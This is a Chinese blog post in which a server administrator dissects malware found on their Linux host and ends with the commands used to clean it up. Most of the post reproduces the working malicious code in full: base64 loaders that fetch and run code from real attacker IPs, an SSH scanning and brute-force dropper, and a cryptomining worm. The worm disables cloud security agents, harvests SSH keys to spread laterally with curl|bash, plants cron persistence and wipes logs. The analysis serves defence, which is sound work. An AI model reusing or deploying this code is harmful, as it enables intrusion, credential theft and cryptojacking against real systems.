---
title: 恶意脚本解析
date: 2023-10-09 19:53:21
updated: 2023-10-09 19:53:21
categories:
  - 全民反诈
tags: 全民反诈
---

```sh
[root@server105 thingsx]# ps -ef | grep nohup
root      59910  56940  0 19:54 pts/2    00:00:00 grep --color=auto nohup
tenant_+  80997  80996  0 10月03 ?      00:00:00 sh -c export PATH=/bin:/sbin:/usr/bin:/usr/local/bin:/usr/sbin; nohup echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly81LjQyLjY3LjMvZS5weSIpLnJlYWQoKSkn | base64 -d | bash
tenant_+  81196  81195  0 10月03 ?      00:00:00 sh -c export PATH=/bin:/sbin:/usr/bin:/usr/local/bin:/usr/sbin; nohup echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly81LjQyLjY3LjMvZS5weSIpLnJlYWQoKSkn | base64 -d | bash
tenant_+  81249  81005 99 10月03 ?      6-17:13:19 sh -c nohup /tmp/spirit scan --range `ip a | grep 'BROADCAST\|inet' | grep -oP 'inet\s+\K\d{1,3}\.\d{1,3}' | grep -v 127 | grep -v inet6 |grep -v 255 | head -n1`.*.* --timeout 3s -p 22 -threads 300
tenant_+  81301  81200 99 10月03 ?      6-17:14:04 sh -c nohup /tmp/spirit scan --range `ip a | grep 'BROADCAST\|inet' | grep -oP 'inet\s+\K\d{1,3}\.\d{1,3}' | grep -v 127 | grep -v inet6 |grep -v 255 | head -n1`.*.* --timeout 3s -p 22 -threads 300
```

其中解析出了一段 python 代码：

```sh
echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly81LjQyLjY3LjMvZS5weSIpLnJlYWQoKSkn | base64 -d

python -c 'import urllib;exec(urllib.urlopen("http://5.42.67.3/e.py").read())
```

```py
import urllib
import platform
import os

if platform.architecture()[0] == "64bit":
    urlx64 = "http://5.42.67.3/spirit"
    urlxx = "http://5.42.67.3/px5"

    f = urllib.urlopen(urlx64)
    if f.code == 200:
        data = f.read()
        with open ("/tmp/spirit", "wb") as code:
            code.write(data)

    xx = urllib.urlopen(urlxx)
    if xx.code == 200:
        data = xx.read()
        with open ("/tmp/p.lst", "wb") as code:
            code.write(data)
        os.chmod("/tmp/spirit", 0o777)
        os.chmod("/tmp/p.lst", 0o777)

        os.system("cd /tmp")
        os.system("rm -rf /tmp/open.lst /tmp/h.lst /tmp/b.lst /tmp/scan.lst")
        os.system("ulimit -n 3000")
        os.system("nohup /tmp/spirit scan --range `ip a | grep 'BROADCAST\|inet' | grep -oP 'inet\s+\K\d{1,3}\.\d{1,3}' | grep -v 127 | grep -v inet6 |grep -v 255 | head -n1`.*.* --timeout 3s -p 22 -threads 300")
        # scan.list 变成 h.lst
        os.system("mv /tmp/scan.lst /tmp/h.lst")
        os.system("nohup /tmp/spirit banner -T 3s")
        # b.lst 追加到 h.list
        os.system("cat /tmp/b.lst | grep OpenSSH > /tmp/h.lst")
        os.system('nohup /tmp/spirit -t 3s -c "(curl -s http://5.42.67.3/2.gif?ssh || wget -q -O - http://5.42.67.3/2.gif?ssh || lwp-download http://5.42.67.3/2.gif /tmp/2.gif) | bash -sh; bash /tmp/2.gif; rm -rf /tmp/2.gif; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly84NC41NC41MC42MS9kLnB5IikucmVhZCgpKScgfHwgcHl0aG9uMiAtYyAnaW1wb3J0IHVybGxpYjtleGVjKHVybGxpYi51cmxvcGVuKCJodHRwOi8vODQuNTQuNTAuNjEvZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; echo ZnVuY3Rpb24gZHcoKSB7IHJlYWQgLXIgcHJvdG8gc2VydmVyIHBhdGggPDw8IiQocHJpbnRmICclcycgIiR7MS8vLy8gfSIpIjsgaWYgWyAiJHByb3RvIiAhPSAiaHR0cDoiIF07IHRoZW4gcHJpbnRmID4mMiAic29ycnksICVzIHN1cHBvcnRzIG9ubHkgaHR0cFxuIiAiJHtGVU5DTkFNRVswXX0iOyByZXR1cm4gMTsgZmk7IERPQz0vJHtwYXRoLy8gLy99OyBIT1NUPSR7c2VydmVyLy86Kn07IFBPUlQ9JHtzZXJ2ZXIvLyo6fTsgWyAiJHtIT1NUfSIgPSAiJHtQT1JUfSIgXSAmJiBQT1JUPTgwOyBleGVjIDM8PiIvZGV2L3RjcC8ke0hPU1R9LyRQT1JUIjsgcHJpbnRmICdHRVQgJXMgSFRUUC8xLjBcclxuSG9zdDogJXNcclxuXHJcbicgIiR7RE9DfSIgIiR7SE9TVH0iID4mMzsgKHdoaWxlIHJlYWQgLXIgbGluZTsgZG8gWyAiJGxpbmUiID0gJCdccicgXSAmJiBicmVhazsgZG9uZSAmJiBjYXQpIDwmMzsgZXhlYyAzPiYtOyB9OyBkdyBodHRwOi8vNS40Mi42Ny4zLyQodW5hbWUgLW0pID4gL3RtcC9iYXNoOyBkdyBodHRwOi8vNS40Mi42Ny4zL2Jhc2hpcmMuJCh1bmFtZSAtbSkgPiAvdG1wL3B5dGhvbjsgY2htb2QgK3ggL3RtcC9iYXNoIC90bXAvcHl0aG9uOyAvdG1wL2Jhc2ggLWMgLXAgODAgLXAgNDQzIC10bHMgLWRwIDgwIC1kcCA0NDMgLXRscyAtZDsgL3RtcC9iYXNoIC1jIC1wIDgwIC1wIDQ0MyAtdGxzIC1kcCA4MCAtZHAgNDQzIC10bHMgLWQgLXB3bjsgcm0gLXJmIC90bXAvYmFzaCAvdG1wL3B5dGhvbg== | base64 -d | bash -" brute -j 300')
        os.system("echo Finished")
```

```sh
echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly84NC41NC41MC42MS9kLnB5IikucmVhZCgpKScgfHwgcHl0aG9uMiAtYyAnaW1wb3J0IHVybGxpYjtleGVjKHVybGxpYi51cmxvcGVuKCJodHRwOi8vODQuNTQuNTAuNjEvZC5weSIpLnJlYWQoKSkn | base64 -d
```

解析为

```sh
python -c 'import urllib;exec(urllib.urlopen("http://84.54.50.61/d.py").read())' || python2 -c 'import urllib;exec(urllib.urlopen("http://84.54.50.61/d.py").read())'
```

```sh
echo ZnVuY3Rpb24gZHcoKSB7IHJlYWQgLXIgcHJvdG8gc2VydmVyIHBhdGggPDw8IiQocHJpbnRmICclcycgIiR7MS8vLy8gfSIpIjsgaWYgWyAiJHByb3RvIiAhPSAiaHR0cDoiIF07IHRoZW4gcHJpbnRmID4mMiAic29ycnksICVzIHN1cHBvcnRzIG9ubHkgaHR0cFxuIiAiJHtGVU5DTkFNRVswXX0iOyByZXR1cm4gMTsgZmk7IERPQz0vJHtwYXRoLy8gLy99OyBIT1NUPSR7c2VydmVyLy86Kn07IFBPUlQ9JHtzZXJ2ZXIvLyo6fTsgWyAiJHtIT1NUfSIgPSAiJHtQT1JUfSIgXSAmJiBQT1JUPTgwOyBleGVjIDM8PiIvZGV2L3RjcC8ke0hPU1R9LyRQT1JUIjsgcHJpbnRmICdHRVQgJXMgSFRUUC8xLjBcclxuSG9zdDogJXNcclxuXHJcbicgIiR7RE9DfSIgIiR7SE9TVH0iID4mMzsgKHdoaWxlIHJlYWQgLXIgbGluZTsgZG8gWyAiJGxpbmUiID0gJCdccicgXSAmJiBicmVhazsgZG9uZSAmJiBjYXQpIDwmMzsgZXhlYyAzPiYtOyB9OyBkdyBodHRwOi8vNS40Mi42Ny4zLyQodW5hbWUgLW0pID4gL3RtcC9iYXNoOyBkdyBodHRwOi8vNS40Mi42Ny4zL2Jhc2hpcmMuJCh1bmFtZSAtbSkgPiAvdG1wL3B5dGhvbjsgY2htb2QgK3ggL3RtcC9iYXNoIC90bXAvcHl0aG9uOyAvdG1wL2Jhc2ggLWMgLXAgODAgLXAgNDQzIC10bHMgLWRwIDgwIC1kcCA0NDMgLXRscyAtZDsgL3RtcC9iYXNoIC1jIC1wIDgwIC1wIDQ0MyAtdGxzIC1kcCA4MCAtZHAgNDQzIC10bHMgLWQgLXB3bjsgcm0gLXJmIC90bXAvYmFzaCAvdG1wL3B5dGhvbg== | base64 -d
```

解析为

```sh
function dw() { 
    read -r proto server path <<<"$(printf '%s' "${1//// }")";

if [ "$proto" != "http:" ];
then printf >&2 "sorry, %s supports only http\n" "${FUNCNAME[0]}";

return 1;
fi;
DOC=/${path// //};
HOST=${server//:*};
PORT=${server//*:};

[ "${HOST}" = "${PORT}" ] && PORT=80;
exec 3<>"/dev/tcp/${HOST}/$PORT";
printf 'GET %s HTTP/1.0\r\nHost: %s\r\n\r\n' "${DOC}" "${HOST}" >&3;

(while read -r line;
do [ "$line" = $'\r' ] && break;
done && cat) <&3;
exec 3>&-; };

dw http://5.42.67.3/$(uname -m) > /tmp/bash;
dw http://5.42.67.3/bashirc.$(uname -m) > /tmp/python;

chmod +x /tmp/bash /tmp/python;

/tmp/bash -c -p 80 -p 443 -tls -dp 80 -dp 443 -tls -d;
/tmp/bash -c -p 80 -p 443 -tls -dp 80 -dp 443 -tls -d -pwn;

rm -rf /tmp/bash /tmp/python
```

## 挖矿病毒

crontab -l

```sh
#!/bin/sh
export PATH=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbin
ps aux | grep -v grep | grep 'givemexyz' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'dbuse' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'kdevtmpfsi' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'javaupDates' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'kinsing' | awk '{print $2}' | xargs -I % kill -9 %
killall /tmp/*
killall /tmp/.*
killall /var/tmp/*
killall /var/tmp/.*
pgrep JavaUpdate | xargs -I % kill -9 %
pgrep kinsing | xargs -I % kill -9 %
pgrep donate | xargs -I % kill -9 %
pgrep kdevtmpfsi | xargs -I % kill -9 %
pgrep sysupdate | xargs -I % kill -9 %
pgrep mysqlserver | xargs -I % kill -9 %
chattr -ia /var/spool/cron/root
crontab -r
crontab -l | grep -e "EgbxdRU9" | grep -v grep
if [ $? -eq 0 ]; then
  echo "cron good"
else
  (
    crontab -l 2>/dev/null
    echo "*/5 * * * * curl -fsSL https://pastebin.com/raw/EgbxdRU9 | sh"
  ) | crontab -
fi
der(){
  if ps aux | grep -i '[a]liyun'; then
    /etc/init.d/aegis uninstall
    (wget -q -O - http://update.aegis.aliyun.com/download/uninstall.sh||curl -s http://update.aegis.aliyun.com/download/uninstall.sh)|bash; lwp-download http://update.aegis.aliyun.com/download/uninstall.sh /tmp/uninstall.sh; bash /tmp/uninstall.sh
    (wget -q -O - http://update.aegis.aliyun.com/download/quartz_uninstall.sh||curl -s http://update.aegis.aliyun.com/download/quartz_uninstall.sh)|bash; lwp-download http://update.aegis.aliyun.com/download/quartz_uninstall.sh /tmp/uninstall.sh; bash /tmp/uninstall.sh
    sudo pkill aliyun-service
    killall -9 aliyun-service
    sudo pkill AliYunDun
    killall -9 AliYunDun
    iptables -I INPUT -s 100.100.30.1/28 -j DROP
    iptables -I INPUT -s 140.205.201.0/28 -j DROP
    iptables -I INPUT -s 140.205.201.16/29 -j DROP
    iptables -I INPUT -s 140.205.201.32/28 -j DROP
    iptables -I INPUT -s 140.205.225.192/29 -j DROP
    iptables -I INPUT -s 140.205.225.200/30 -j DROP
    iptables -I INPUT -s 140.205.225.184/29 -j DROP
    iptables -I INPUT -s 140.205.225.183/32 -j DROP
    iptables -I INPUT -s 140.205.225.206/32 -j DROP
    iptables -I INPUT -s 140.205.225.205/32 -j DROP
    iptables -I INPUT -s 140.205.225.195/32 -j DROP
    iptables -I INPUT -s 140.205.225.204/32 -j DROP
    rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service
    rm -rf /usr/local/aegis*
    systemctl stop aliyun.service
    systemctl disable aliyun.service
    service bcm-agent stop
    yum remove bcm-agent -y
    apt-get remove bcm-agent -y
    /usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh stop
    /usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh remove
    rm -rf /usr/local/cloudmonitor
  elif ps aux | grep -i '[y]unjing'; then
    process=(sap100 secu-tcs-agent sgagent64 barad_agent agent agentPlugInD pvdriver )
    for i in ${process[@]}
    do
      for A in $(ps aux | grep $i | grep -v grep | awk '{print $2}')
      do
        kill -9 $A
      done
    done
    chkconfig --level 35 postfix off
    service postfix stop
    /usr/local/qcloud/stargate/admin/stop.sh
    /usr/local/qcloud/stargate/admin/uninstall.sh
    /usr/local/qcloud/YunJing/uninst.sh
    /usr/local/qcloud/monitor/barad/admin/stop.sh
    /usr/local/qcloud/monitor/barad/admin/uninstall.sh
    rm -rf /usr/local/sa
    rm -rf /usr/local/agenttools
    rm -rf /usr/local/qcloud
    rm -f /etc/cron.d/sgagenttask
  fi
  sleep 1
  echo "DER Uninstalled"
}
localgo() {
  echo "localgo start"
  myhostip=$(curl -sL icanhazip.com)
  KEYS=$(find ~/ /root /home -maxdepth 3 -name 'id_rsa*' | grep -vw pub)
  KEYS2=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep IdentityFile | awk -F "IdentityFile" '{print $2 }')
  KEYS3=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)" | awk -F ' -i ' '{print $2}' | awk '{print $1'})
  KEYS4=$(find ~/ /root /home -maxdepth 3 -name '*.pem' | uniq)
  HOSTS=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep HostName | awk -F "HostName" '{print $2}')
  HOSTS2=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)" | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}")
  HOSTS3=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)" | tr ':' ' ' | awk -F '@' '{print $2}' | awk -F '{print $1}')
  HOSTS4=$(cat /etc/hosts | grep -vw "0.0.0.0" | grep -vw "127.0.1.1" | grep -vw "127.0.0.1" | grep -vw $myhostip | sed -r '/\n/!s/[0-9.]+/\n&\n/;/^([0-9]{1,3}\.){3}[0-9]{1,3}\n/P;D' | awk '{print $1}')
  HOSTS5=$(cat ~/*/.ssh/known_hosts /home/*/.ssh/known_hosts /root/.ssh/known_hosts | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}" | uniq)
  HOSTS6=$(ps auxw | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}" | grep ":22" | uniq)
  USERZ=$(
    echo "root"
    find ~/ /root /home -maxdepth 2 -name '\.ssh' | uniq | xargs find | awk '/id_rsa/' | awk -F'/' '{print $3}' | uniq | grep -wv ".ssh"
  )
  USERZ2=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -vw "cp" | grep -vw "mv" | grep -vw "cd " | grep -vw "nano" | grep -v grep | grep -E "(ssh|scp)" | tr ':' ' ' | awk -F '@' '{print $1}' | awk '{print $4}' | uniq)
  sshports=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -vw "cp" | grep -vw "mv" | grep -vw "cd " | grep -vw "nano" | grep -v grep | grep -E "(ssh|scp)" | tr ':' ' ' | awk -F '-p' '{print $2}' | awk '{print $1}' | sed 's/[^0-9]*//g' | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2- | sed -e "\$a22")
  userlist=$(echo "$USERZ $USERZ2" | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2- | grep -vw "." | grep -vw "ssh" | sed '/\./d')
  hostlist=$(echo "$HOSTS $HOSTS2 $HOSTS3 $HOSTS4 $HOSTS5 $HOSTS6" | grep -vw 127.0.0.1 | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2-)
  keylist=$(echo "$KEYS $KEYS2 $KEYS3 $KEYS4" | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2-)
  i=0
  for user in $userlist; do
    for host in $hostlist; do
      for key in $keylist; do
        for sshp in $sshports; do
          ((i++))
          if [ "${i}" -eq "20" ]; then
            sleep 5
            ps wx | grep "ssh -o" | awk '{print $1}' | xargs kill -9 &>/dev/null &
            i=0
          fi

          #Wait 5 seconds after every 20 attempts and clean up hanging processes

          chmod +r $key
          chmod 400 $key
          echo "$user@$host"
          ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=3 -i $key $user@$host -p $sshp "(curl -s http://45.144.3.216:10000/rnv2ymcl||wget -q -O - http://45.144.3.216:10000/rnv2ymcl)|bash -sh"
          ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=3 -i $key $user@$host -p $sshp "(curl -s http://45.144.3.216:10000/rnv2ymcl||wget -q -O - http://45.144.3.216:10000/rnv2ymcl)|bash -sh"
        done
      done
    done
  done
  # scangogo
  echo "local done"
}
cron(){
  if cat /etc/cron.d/`whoami` /etc/cron.d/apache /var/spool/cron/`whoami` /var/spool/cron/crontabs/`whoami` /etc/cron.hourly/oanacroner1 | grep -q "205.185.113.151\|5.196.247.12\|bash.givemexyz.xyz\|194.156.99.30\|cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8xOTQuMTU2Ljk5LjMwL2QucHkiKS5yZWFkKCkpJw==\|bash.givemexyz.in\|205.185.116.78"
  then
    chattr -i -a /etc/cron.d/`whoami` /etc/cron.d/apache /var/spool/cron/`whoami` /var/spool/cron/crontabs/`whoami` /etc/cron.hourly/oanacroner1
    crontab -r
  fi
  if cat /etc/cron.d/`whoami` /etc/cron.d/apache /var/spool/cron/`whoami` /var/spool/cron/crontabs/`whoami` /etc/cron.hourly/oanacroner1 | grep "45.144.3.216"
  then
    echo "Cron exists"
  else
    apt-get install -y cron
    yum install -y vixie-cron crontabs
    service crond start
    chkconfig --level 35 crond on
    echo "Cron not found"
    echo -e "30 23 * * * root (curl -s http://45.144.3.216:10000/rnv2ymcl||wget -q -O - http://45.144.3.216:10000/rnv2ymcl )|bash -sh\n##" > /etc/cron.d/`whoami`
    echo -e "30 23 * * * root (curl -s http://45.144.3.216:10000/rnv2ymcl||wget -q -O - http://45.144.3.216:10000/rnv2ymcl )|bash -sh\n##" > /etc/cron.d/apache
    echo -e "30 23 * * * root (curl -s http://45.144.3.216:10000/rnv2ymcl||wget -q -O - http://45.144.3.216:10000/rnv2ymcl )|bash -sh\n##" > /etc/cron.d/nginx
    echo -e "30 23 * * * (curl -s http://45.144.3.216:10000/rnv2ymcl||wget -q -O - http://45.144.3.216:10000/rnv2ymcl )|bash -sh\n##" > /var/spool/cron/`whoami`
    mkdir -p /var/spool/cron/crontabs
    echo -e "30 23 * * * (curl -s http://45.144.3.216:10000/rnv2ymcl||wget -q -O - http://45.144.3.216:10000/rnv2ymcl )|bash -sh\n##" > /var/spool/cron/crontabs/`whoami`
    mkdir -p /etc/cron.hourly
    echo "(curl -s http://45.144.3.216:10000/rnv2ymcl||wget -q -O - http://45.144.3.216:10000/rnv2ymcl )|bash -sh" > /etc/cron.hourly/oanacroner1 | chmod 755 /etc/cron.hourly/oanacroner1
    echo "(curl -s http://45.144.3.216:10000/rnv2ymcl||wget -q -O - http://45.144.3.216:10000/rnv2ymcl )|bash -sh" > /etc/cron.hourly/oanacroner1 | chmod 755 /etc/init.d/down
    chattr +ai -V /etc/cron.d/`whoami` /etc/cron.d/apache /var/spool/cron/`whoami` /var/spool/cron/crontabs/`whoami` /etc/cron.hourly/oanacroner1 /etc/init.d/down
  fi
  chattr -i -a /etc/cron.d/`whoami` /etc/cron.d/apache /var/spool/cron/`whoami` /var/spool/cron/crontabs/`whoami` /etc/cron.hourly/oanacroner1
  echo "(curl -s http://45.144.3.216:10000/rnv2ymcl||wget -q -O - http://45.144.3.216:10000/rnv2ymcl )|bash -sh" > /etc/init.d/down | chmod 755 /etc/init.d/down
}
rm -f /tmp/*
rm -f /tmp/.sola
s2=`whoami`
if [ `whoami` = "root" ];
then
    chattr -ia /etc/cron.d/*
    rm -rf /etc/cron.d/*
    chattr -i /var/spool/cron/crontabs/root
    chattr -i /usr/local/bin/dns
    rm -f /etc/cron.hourly/oanacroner
    rm -f /etc/cron.hourly/oanacrona
    rm -f /etc/cron.daily/oanacroner
    rm -f /etc/cron.daily/oanacrona
    rm -f /etc/cron.monthly/oanacroner
    rm -f /usr/local/bin/dns
    rm -f /etc/update.sh
    chattr -ia /etc/hosts
    echo >/etc/hosts
    chattr +ia /etc/hosts
    chattr -i /etc/sysupdate
    rm -f /etc/sysupdate
    rm -f /etc/config.json
    rm -f /var/tmp/kworkerds
    rm -f /usr/bin/.systemcero
    rm -f /usr/bin/cloudupdate
    rm -f /usr/bin/diskmanagerd
    rm -f /lib/libterminfo.so
    rm -f /bin/httpsntp
    rm -f /bin/ftpsntp
    rm -f /var/tmp/jspserv
    rm -f /usr/sbin/cron
    rm -f /usr/bin/kinsing*
    rm -f /etc/cron.d/kinsing*
    rm -f /usr/bin/node
    chattr -isa /var/spool/cron/*
    rm -rf /var/spool/cron/*
    chattr +isa /tmp/xms
    rm -f /var/tmp/kinsing
    chattr -ia /etc/crontab
    echo '*/10 * * * * root curl -fsSL https://pastebin.com/raw/EgbxdRU9 | sh' > /etc/crontab
    chattr +ia /etc/crontab
    chattr -ia /var/spool/cron/root
    chattr -ia /var/spool/cron/crontabs/root
    echo '*/10 * * * * curl -fsSL https://pastebin.com/raw/EgbxdRU9 | bash' >/var/spool/cron/root
    echo '*/10 * * * * curl -fsSL https://pastebin.com/raw/EgbxdRU9 | bash' >/var/spool/cron/crontabs/root
    echo '*/10 * * * * root curl -fsSL https://pastebin.com/raw/EgbxdRU9 | sh' > /etc/cron.d/root
    chattr +ia /var/spool/cron/root
    chattr +ia /etc/cron.d/root
    chattr +ia /var/spool/cron/crontabs/root
else
    ps aux | grep -v 'java\|redis\|weblogic\|mongod\|mysql\|oracle\|tomcat\|grep\|postgres\|atlassian\|awk\|sbin\|WebLogic.sh\|solr\|server\|aux\|httpd\|sh\|sbin|' | grep ${s2:0:7} | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v 'java\|redis\|weblogic\|mongod\|mysql\|oracle\|tomcat\|grep\|postgres\|atlassian\|awk\|sbin\|WebLogic.sh\|solr\|server\|aux\|httpd\|sh\|defunct\|sbin|' | grep $s2 | awk '{print $2}' | xargs -I % kill -9 %
fi
chmod +777 /tmp/*
pkill networkservice
pkill networkser+
pkill watchbog
pkill xmrig
rm -rf /tmp/.solr
mkdir /tmp/.solr
p=$(ps auxf | grep solrd | awk '{if($3>=60.0) print $2}')
name=""$p
if [ -z "$name" ]
then
    pkill solr.sh
    pkill solrd
    ps aux | grep -v grep | grep -v 'java\|redis\|mongod\|mysql\|oracle\|tomcat\|grep\|postgres\|confluence\|awk\|aux\|sh' | awk '{if($3>60.0) print $2}' | xargs -I % kill -9 %
    rm -rf /tmp/.solr
    mkdir /tmp/.solr
    chmod +rwx /tmp/.solr
    curl -fsSL http://45.144.3.216:10000/starrail/config/v2.json -o /tmp/.solr/config.json
    curl -fsSL http://45.144.3.216:10000/starrail/cbt2zip/setup.exe -o /tmp/.solr/solrd
    curl -fsSL http://45.144.3.216:10000/solr.sh -o /tmp/.solr/solr.sh	
    chmod +x /tmp/.solr/solrd
    chmod +x /tmp/.solr/solr.sh
    nohup /tmp/.solr/solr.sh &>>/dev/null &
    sleep 10
    rm -f /tmp/.solr/solr.sh
    localgo
    cron
else
    exit
fi
history -c
echo 0>/root/.ssh/authorized_keys
echo 0>/var/spool/mail/root
echo 0>/var/log/wtmp
echo 0>/var/log/secure
echo 0>/var/log/cronrot
echo 0>~/.bash_history
```

5 处理（它是 10 秒的调度周期，人工一个一个处理的话，很可能人工还没处理完，另外的调度任务又把前面的定时任务补上了，所以改成脚本批量处理）

```sh
kill -9 11779
kill -9 11773
kill -9 11423
kill -9 11507
kill -9 11508
 
rm -rf  /tmp/.solr

# 将文件或目录设置为“inactive”状态。在这种状态下，文件或目录将不再被系统自动加载或执行
chattr -ia /etc/crontab
chattr -ia /var/spool/cron/root
chattr -ia /var/spool/cron/crontabs/root
chattr -ia /etc/cron.d/root

cat /dev/null  > /etc/crontab
cat /dev/null  > /var/spool/cron/root
cat /dev/null  > /var/spool/cron/crontabs/root
cat /dev/null  > /etc/cron.d/root
 
# 将文件或目录从“inactive”状态中解除
chattr +ia /etc/crontab
chattr +ia /var/spool/cron/root
chattr +ia /var/spool/cron/crontabs/root
chattr +ia /etc/cron.d/root
```
